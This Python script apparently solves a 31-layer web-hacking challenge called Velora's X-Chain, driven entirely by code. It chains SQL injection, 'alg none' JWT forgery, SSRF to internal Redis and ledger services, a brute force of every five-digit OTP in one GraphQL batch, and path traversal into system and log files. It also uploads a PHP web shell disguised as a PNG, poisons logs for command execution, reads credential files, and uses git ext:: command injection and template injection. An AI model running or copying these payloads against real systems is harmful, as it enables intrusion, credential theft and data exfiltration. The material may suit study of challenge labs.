#!/usr/bin/env python3
"""Solve Velora's rotating 31-layer X-Chain.

Usage: python3 solve.py <URL>
"""

import base64
import hashlib
import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

MEMBER_ID = "7c2a9e14-6b38-4d1f-9a55-2e8f0b6c1d47"
NAME = "Design review"
EMAIL = "preview@velora.example"
PASSWORD = "harbor-preview-19"
PLAN = "enterprise"
CATALOG_QUERY = "' UNION SELECT id,name,detail,NULL,NULL,NULL,NULL FROM fabric_routes--"
PREVIEW_URLS = (
    "http://fabric.velora.internal:80/",
    "http://2130706433:80/",
    "http://2130706433:6379/",
    "dict://2130706433:6379/keys:*",
    "dict://2130706433:6379/get%20operator.session",
)
FORWARDED_HOST = "fabric.velora.internal"
NAV_ROLE = "x' UNION SELECT '/delay',sleep(3) #"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def b64decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def decode_response(response) -> str:
    return response.read().decode("utf-8", errors="replace")


def extract_entry(text: str, label: str) -> str:
    match = re.search(rf"{re.escape(label)}\s*:\s*/x/([0-9a-f]+)", text, re.I)
    if not match:
        raise RuntimeError(f"Could not find {label!r} X-Chain entry")
    return match.group(1)


def parse_layer(text: str) -> dict:
    try:
        result = json.loads(text)
    except json.JSONDecodeError as exc:
        raise RuntimeError(f"Expected JSON layer response; got {text[:400]!r}") from exc
    if not isinstance(result, dict):
        raise RuntimeError(f"Unexpected layer response: {result!r}")
    return result


def main() -> int:
    if len(sys.argv) != 2:
        raise SystemExit(f"usage: {sys.argv[0]} <URL>")
    base = sys.argv[1].rstrip("/")
    host = urllib.parse.urlsplit(base).hostname or "localhost"
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    def request(
        path: str,
        data: dict | None = None,
        proofs: list[str] | None = None,
        headers: dict[str, str] | None = None,
    ) -> str:
        body = urllib.parse.urlencode(data).encode() if data is not None else None
        req = urllib.request.Request(base + path, data=body)
        if proofs:
            req.add_header("X-Chain", "|".join(proofs))
        for key, value in (headers or {}).items():
            req.add_header(key, value)
        try:
            with opener.open(req, timeout=30) as response:
                return decode_response(response)
        except urllib.error.HTTPError as exc:
            return decode_response(exc)

    def get_cookie(cookie_name: str) -> str | None:
        return next((cookie.value for cookie in jar if cookie.name == cookie_name), None)

    def set_cookie(cookie_name: str, value: str) -> None:
        jar.set_cookie(http.cookiejar.Cookie(
            version=0, name=cookie_name, value=value, port=None,
            port_specified=False, domain=host, domain_specified=False,
            domain_initial_dot=False, path="/", path_specified=True,
            secure=False, expires=None, discard=True, comment=None,
            comment_url=None, rest={}, rfc2109=False,
        ))

    def forge_jwt_role(role: str) -> None:
        token = get_cookie("velora_session")
        if not token:
            raise RuntimeError("No velora_session cookie to forge")
        parts = token.split(".")
        if len(parts) < 2:
            raise RuntimeError("velora_session is not a JWT")
        claims = json.loads(b64decode(parts[1]))
        claims["role"] = role
        set_cookie("velora_session", ".".join((
            b64url(b'{"alg":"none","typ":"JWT"}'),
            b64url(json.dumps(claims, separators=(",", ":")).encode()), "",
        )))

    def post_json(path: str, payload: dict, proofs: list[str], timeout: int = 30) -> str:
        req = urllib.request.Request(
            base + path,
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json", "X-Chain": "|".join(proofs)},
        )
        try:
            with opener.open(req, timeout=timeout) as response:
                return decode_response(response)
        except urllib.error.HTTPError as exc:
            return decode_response(exc)

    layer = 0
    # Create one authenticated session. Public entry points rotate, so read them fresh.
    request("/")
    request("/signup", {
        "name": NAME, "email": EMAIL, "password": PASSWORD,
        "plan": PLAN, "memberId": MEMBER_ID,
    })
    entries = {
        "channel": extract_entry(request("/"), "channel"),
        "budget": extract_entry(request("/robots.txt"), "budget"),
        "map": extract_entry(request("/static/app.js"), "map"),
    }
    operator_token: str | None = None
    proofs: list[str] = []
    result: dict = {}

    def visit(hex_id: str, headers: dict[str, str] | None = None) -> dict:
        nonlocal layer
        result = parse_layer(request(f"/x/{hex_id}", proofs=proofs, headers=headers))
        if result.get("proof"):
            proofs.append(str(result["proof"]))
        layer = int(result.get("layer", layer + 1))
        print(f"L{layer}: {result.get('note', result.get('message', result))}")
        return result

    for key in ("channel", "budget", "map"):
        result = visit(entries[key])
    current = result.get("next")
    if not current:
        raise RuntimeError(f"L3 response missing next: {result!r}")

    while current:
        next_layer = layer + 1
        if next_layer == 5:
            text = request(f"/api/members/{MEMBER_ID}/settings")
            print("Settings:", text[:500])
        elif next_layer == 6:
            text = request("/login", {"email": EMAIL, "password": PASSWORD})
            if "Sign in" in text and "Invalid" in text:
                raise RuntimeError("Login failed before L6")
        elif next_layer == 7:
            forge_jwt_role("admin")
        elif next_layer == 8:
            text = request("/api/v1/export/1001")
            print("Legacy export:", text[:220].replace("\n", " "))
        elif next_layer == 9:
            text = request("/catalog?" + urllib.parse.urlencode({"q": CATALOG_QUERY}))
            print("Catalog:", text[:350].replace("\n", " "))
        elif next_layer in (10, 11, 12, 13):
            target_url = PREVIEW_URLS[0 if next_layer < 12 else next_layer - 11]
            headers = {"X-Forwarded-Host": FORWARDED_HOST} if next_layer in (10, 11) else {}
            text = request(
                "/api/preview?" + urllib.parse.urlencode({"url": target_url}),
                headers=headers,
            )
            print(f"Preview before L{next_layer}:", text[:220].replace("\n", " "))
        elif next_layer == 14:
            text = request("/api/preview?" + urllib.parse.urlencode({"url": PREVIEW_URLS[3]}))
            print("Redis keys:", text[:300].replace("\n", " "))
        elif next_layer == 15:
            text = request("/api/preview?" + urllib.parse.urlencode({"url": PREVIEW_URLS[4]}))
            operator_token = json.loads(text).get("data") if text.strip().startswith("{") else None
            if not operator_token:
                raise RuntimeError(f"L15 preview missing operator token: {text[:300]!r}")
        elif next_layer == 16:
            if not operator_token:
                raise RuntimeError("L16 reached without an operator token")
            set_cookie("operator", str(operator_token))
        elif next_layer in (17, 18):
            query = "query { health }" if next_layer == 17 else "{ accounts { holder internalLedgerKey } }"
            payload = {
                "query": query,
                "extensions": {"persistedQuery": {
                    "version": 1,
                    "sha256Hash": hashlib.sha256(query.encode()).hexdigest(),
                }},
            }
            text = post_json("/api/graphql", payload, proofs=proofs)
            print(f"GraphQL op before L{next_layer}:", text[:200].replace("\n", " "))
        elif next_layer == 19:
            # Enumerate every five-digit code in one aliased GraphQL mutation.
            codes = [f"{i:05d}" for i in range(100000)]
            parts = " ".join(
                f'c{i}: verifyOtp(code: "{code}") {{ ok }}'
                for i, code in enumerate(codes)
            )
            text = post_json(
                "/api/graphql", {"query": "mutation { " + parts + " }"},
                proofs=proofs, timeout=300,
            )
            print(f"Step-up before L{next_layer}:", text[:160].replace("\n", " "))
            if '"ok": true' not in text:
                raise RuntimeError(f"Step-up batch rejected: {text[:200]!r}")
        elif next_layer == 20:
            text = request("/dashboard")
            print("Dashboard before L20:", "loaded" if "Operations" in text else text[:200])
            home = request("/dashboard?" + urllib.parse.urlencode({"page": "dashboard-pages/home.html"}))
            home_rendered = "failed to open stream" not in home
            home_flat = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", home)).strip()
            print(f"  home template load: {'RENDER — ' if home_rendered else 'missing — '}{home_flat[:300]}")
        elif next_layer == 21:
            schema_page = "dashboard-pages/../../secret/schema.txt"
            schema_body = request("/dashboard?" + urllib.parse.urlencode({"page": schema_page}), proofs=proofs)
            schema_rendered = "failed to open stream" not in schema_body
            schema_flat = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", schema_body)).strip()
            print(f"L21 schema read {schema_page}: {'RENDER — ' if schema_rendered else 'missing — '}{schema_flat[:1000]}")
        elif next_layer == 22:
            handler_doc = "library/../../../../../etc/apache2/mods-enabled/php.conf"
            handler = request("/library?" + urllib.parse.urlencode({"doc": handler_doc}), proofs=proofs)
            print("L22 handler map:", " ".join(handler.split())[:500])
        elif next_layer == 23:
            boundary = "----velora-boundary"
            php_payload = '<?php system($_GET["c"]); ?>'
            parts = [
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nProbe\r\n",
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{EMAIL}\r\n",
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"subject\"\r\n\r\nhandler\r\n",
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"message\"\r\n\r\nhandler\r\n",
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"attachment\"; filename=\"sh.php.png\"\r\nContent-Type: image/png\r\n\r\n{php_payload}",
                f"\r\n--{boundary}--\r\n",
            ]
            upload = urllib.request.Request(
                base + "/support", data="".join(parts).encode(),
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}", "X-Chain": "|".join(proofs)},
            )
            with opener.open(upload, timeout=30) as response:
                upload_body = decode_response(response)
            print("L23 upload:", "stored" if "Stored /uploads/sh.php.png" in upload_body else upload_body[:300])
            desk_id = request("/uploads/sh.php.png?" + urllib.parse.urlencode({"c": "id"}), proofs=proofs)
            print("L23 desk command:", desk_id.strip())
        elif next_layer == 24:
            poison = '<?php system($_GET["c"]); ?>'
            request("/", proofs=proofs, headers={"User-Agent": poison})
            log_page = "dashboard-pages/../../../../../var/log/apache2/access.log"
            output = request("/dashboard?" + urllib.parse.urlencode({"page": log_page, "c": "id"}), proofs=proofs)
            match = re.search(r"uid=\d+\([^)]*\).*", output)
            print("L24 web command:", match.group(0)[:300] if match else output[-500:])
        elif next_layer == 25:
            log_page = "dashboard-pages/../../../../../var/log/apache2/access.log"
            output = request("/dashboard?" + urllib.parse.urlencode({"page": log_page, "c": "cat /entrypoint.sh"}), proofs=proofs)
            user = re.search(r"RECON_USER=([^\s<]+)", output)
            if not user:
                raise RuntimeError(f"L25 missing RECON_USER: {output[-300:]!r}")
            recon_user = user.group(1)
            print(f"L25 service account: {recon_user}")
        elif next_layer == 26:
            output = request("/uploads/sh.php.png?" + urllib.parse.urlencode({"c": "cat /opt/velora/reconcile.env"}), proofs=proofs)
            env = re.search(r"RECON_PASS=([^\s<]+)", output)
            if not env:
                raise RuntimeError(f"L26 missing RECON_PASS: {output[-300:]!r}")
            recon_pass = env.group(1)
        elif next_layer == 27:
            repo_url = r"ext::sh -c cat${IFS}/opt/velora/nightly.sh>&2"
            output = request("/import", data={"repo_url": repo_url}, proofs=proofs)
            job = re.search(r"<pre class='mono'>(.*?)</pre>", output, re.S)
            print("L27 job script:", job.group(1).strip() if job else output[-1000:])
        elif next_layer == 28:
            payload = "{{ cycler.__init__.__globals__.os.popen('cat /root/velora/release.note').read() }}"
            output = request("/request-demo", data={
                "name": payload, "email": EMAIL, "company": "Velora", "message": "release review",
            }, proofs=proofs)
            print("L28 release note:", output[-1200:])
        elif next_layer == 29:
            reconcile_url = f"http://{recon_user}:{recon_pass}@2130706433:9200/ledger/reconcile"
            output = request("/api/preview?" + urllib.parse.urlencode({"url": reconcile_url}), proofs=proofs)
            print("L29 settlement reconcile:", output[:1000])
        elif next_layer == 30:
            forge_jwt_role(NAV_ROLE)
        elif next_layer == 31:
            forge_jwt_role("x' UNION SELECT value,value FROM config WHERE name='settlement_record' #")

        hex_id = str(current).rsplit("/", 1)[-1]
        headers = {"X-Forwarded-Host": FORWARDED_HOST} if next_layer == 10 else None
        result = visit(hex_id, headers=headers)
        for checked in (10, 12, 14, 15, 16, 17, 18, 19, 20):
            if layer == checked and result.get("ok") is not True:
                raise RuntimeError(f"Layer {checked} rejected request: {result!r}")
        current = result.get("next")
        if layer >= 14 and not current:
            if result.get("ok") is True:
                print(result.get("settlement_record", "L31 complete"))
            return 0 if result.get("ok") is True else 1

    raise RuntimeError(f"Chain ended unexpectedly (last layer {layer})")


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (RuntimeError, urllib.error.URLError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
